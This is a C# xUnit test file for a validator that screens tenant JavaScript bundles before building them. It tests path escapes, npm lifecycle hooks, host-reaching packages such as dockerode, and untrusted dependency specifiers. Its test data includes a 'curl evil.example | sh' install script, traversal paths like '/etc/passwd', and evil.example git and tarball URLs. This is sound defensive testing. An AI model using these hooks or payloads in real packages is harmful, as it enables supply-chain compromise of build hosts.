using Blocks.FunctionRunner.Builds;
using FluentAssertions;
using Xunit;

namespace Blocks.FunctionRunner.Tests
{
    /// <summary>
    /// Build-time screening. The build step runs dependency code the tenant chose, on a host
    /// that can reach the Docker Engine, so this is the cheap first pass that keeps obviously
    /// hostile bundles away from a builder entirely.
    /// </summary>
    public class SourceValidatorTests
    {
        private static SourceFile Manifest(string json = """{"type":"module"}""") => new("package.json", json);
        private static SourceFile Index() => new("index.js", "export default async () => 1;");

        private static List<SourceFile> Good() => [Index(), Manifest()];

        [Fact]
        public void A_well_formed_bundle_passes()
        {
            SourceValidator.Validate(Good(), allowScripts: false).Ok.Should().BeTrue();
        }

        [Fact]
        public void An_empty_bundle_is_refused()
        {
            SourceValidator.Validate([], false).Reason.Should().Contain("empty");
        }

        [Fact]
        public void A_bundle_without_index_js_is_refused()
        {
            SourceValidator.Validate([Manifest()], false).Reason.Should().Contain("index.js");
        }

        [Fact]
        public void A_bundle_without_package_json_is_refused()
        {
            SourceValidator.Validate([Index()], false).Reason.Should().Contain("package.json");
        }

        [Fact]
        public void Commonjs_is_refused_because_the_runtime_imports_an_es_module()
        {
            var files = new List<SourceFile> { Index(), Manifest("""{"name":"x"}""") };

            SourceValidator.Validate(files, false).Reason.Should().Contain("type");
        }

        [Theory]
        [InlineData("../escape.js")]
        [InlineData("/etc/passwd")]
        [InlineData("a/../../b.js")]
        [InlineData("dir\\file.js")]
        [InlineData("node_modules/evil/index.js")]
        public void A_path_that_escapes_the_workspace_is_refused(string path)
        {
            var files = new List<SourceFile> { Index(), Manifest(), new(path, "x") };

            SourceValidator.Validate(files, false).Ok.Should().BeFalse();
        }

        [Theory]
        [InlineData("preinstall")]
        [InlineData("postinstall")]
        [InlineData("prepare")]
        public void Lifecycle_scripts_are_refused_unless_the_function_opts_in(string script)
        {
            var manifest = Manifest($$$"""{"type":"module","scripts":{"{{{script}}}":"curl evil.example | sh"}}""");
            var files = new List<SourceFile> { Index(), manifest };

            SourceValidator.Validate(files, allowScripts: false).Reason.Should().Contain(script);
            SourceValidator.Validate(files, allowScripts: true).Ok.Should().BeTrue();
        }

        [Fact]
        public void A_harmless_script_name_is_not_a_lifecycle_hook()
        {
            var manifest = Manifest("""{"type":"module","scripts":{"test":"node --test"}}""");

            SourceValidator.Validate([Index(), manifest], false).Ok.Should().BeTrue();
        }

        [Theory]
        [InlineData("dockerode")]
        [InlineData("@kubernetes/client-node")]
        public void Packages_that_exist_to_reach_the_host_are_refused(string package)
        {
            var manifest = Manifest($$$"""{"type":"module","dependencies":{"{{{package}}}":"^1.0.0"}}""");

            SourceValidator.Validate([Index(), manifest], false).Reason.Should().Contain(package);
        }

        /// <summary>
        /// With no lockfile in the pipeline, package.json is the only description of what npm is
        /// about to fetch. A specifier that names a path, a repository, an alias or a floating tag
        /// resolves somewhere this screening never looked, so none of them are accepted.
        /// </summary>
        [Theory]
        [InlineData("file:../../../etc")]
        [InlineData("git+https://evil.example/pkg.git")]
        [InlineData("link:/opt")]
        [InlineData("workspace:*")]
        [InlineData("portal:/opt/pkg")]
        [InlineData("npm:something-else@1.0.0")]
        [InlineData("evil-user/evil-repo")]
        [InlineData("github:evil-user/evil-repo")]
        [InlineData("git@github.com:evil/pkg.git")]
        [InlineData("https://evil.example/pkg.tgz")]
        [InlineData("latest")]
        [InlineData("next")]
        [InlineData("*")]
        [InlineData("x")]
        [InlineData("")]
        [InlineData("   ")]
        public void Dependency_specifiers_that_do_not_name_a_registry_version_are_refused(string spec)
        {
            var manifest = Manifest($$$"""{"type":"module","dependencies":{"x":"{{{spec}}}"}}""");

            SourceValidator.Validate([Index(), manifest], false).Ok.Should().BeFalse();
        }

        [Fact]
        public void A_dependency_whose_specifier_is_not_even_a_string_is_refused()
        {
            var manifest = Manifest("""{"type":"module","dependencies":{"x":{"version":"1.0.0"}}}""");

            SourceValidator.Validate([Index(), manifest], false).Reason.Should().Contain("string");
        }

        [Theory]
        [InlineData("^3.23.8")]
        [InlineData("3.23.8")]
        [InlineData("~3.23")]
        [InlineData("3.x")]
        [InlineData(">=3.23.8 <4.0.0")]
        [InlineData("3.0.0-beta.1")]
        [InlineData("^1.0.0 || ^2.0.0")]
        [InlineData("v3.23.8")]
        [InlineData("1.2.3 - 2.3.4")]
        public void A_normal_registry_dependency_is_allowed(string spec)
        {
            var manifest = Manifest($$$"""{"type":"module","dependencies":{"zod":"{{{spec}}}"}}""");

            SourceValidator.Validate([Index(), manifest], false).Ok.Should().BeTrue();
        }

        [Theory]
        [InlineData("optionalDependencies")]
        [InlineData("peerDependencies")]
        public void Every_section_npm_installs_from_is_screened(string section)
        {
            // npm installs optional dependencies, and peers automatically since npm 7. Screening
            // only dependencies and devDependencies would leave both as a way straight past it.
            var blocked = Manifest($$$"""{"type":"module","{{{section}}}":{"dockerode":"^4.0.0"}}""");
            var badSpec = Manifest($$$"""{"type":"module","{{{section}}}":{"x":"github:evil/pkg"}}""");

            SourceValidator.Validate([Index(), blocked], false).Reason.Should().Contain("dockerode");
            SourceValidator.Validate([Index(), badSpec], false).Ok.Should().BeFalse();
        }

        [Theory]
        [InlineData("""{"ky":"file:/opt/evil"}""")]
        [InlineData("""{"ky":{"nested-dep":"github:evil/pkg"}}""")]
        [InlineData("""{"ky":"latest"}""")]
        public void Overrides_are_screened_like_dependencies(string overrides)
        {
            // An override rewrites the version of any package in the tree, transitive ones
            // included, so an unscreened specifier here reaches further than one in dependencies.
            var manifest = Manifest($$$"""{"type":"module","overrides":{{{overrides}}}}""");

            SourceValidator.Validate([Index(), manifest], false).Ok.Should().BeFalse();
        }

        [Fact]
        public void A_reasonable_override_still_passes()
        {
            var manifest = Manifest("""
                {"type":"module","dependencies":{"ky":"^1.7.0"},
                 "overrides":{"semver":"^7.5.4","ky":{"node-fetch":"$node-fetch"}}}
                """);

            SourceValidator.Validate([Index(), manifest], false).Ok.Should().BeTrue();
        }

        [Fact]
        public void Yarn_resolutions_are_screened_too()
        {
            var manifest = Manifest("""{"type":"module","resolutions":{"semver":"git+https://evil.example/s.git"}}""");

            SourceValidator.Validate([Index(), manifest], false).Ok.Should().BeFalse();
        }

        [Fact]
        public void An_oversized_bundle_is_refused()
        {
            var files = new List<SourceFile> { Index(), Manifest(), new("big.js", new string('x', 3 * 1024 * 1024)) };

            SourceValidator.Validate(files, false).Reason.Should().Contain("limit");
        }

        [Fact]
        public void Too_many_files_are_refused()
        {
            var files = new List<SourceFile> { Index(), Manifest() };
            for (var i = 0; i < 300; i++) files.Add(new SourceFile($"f{i}.js", "x"));

            SourceValidator.Validate(files, false).Reason.Should().Contain("file limit");
        }

        [Fact]
        public void Malformed_package_json_is_refused()
        {
            SourceValidator.Validate([Index(), Manifest("{not json")], false)
                .Reason.Should().Contain("not valid JSON");
        }
    }
}
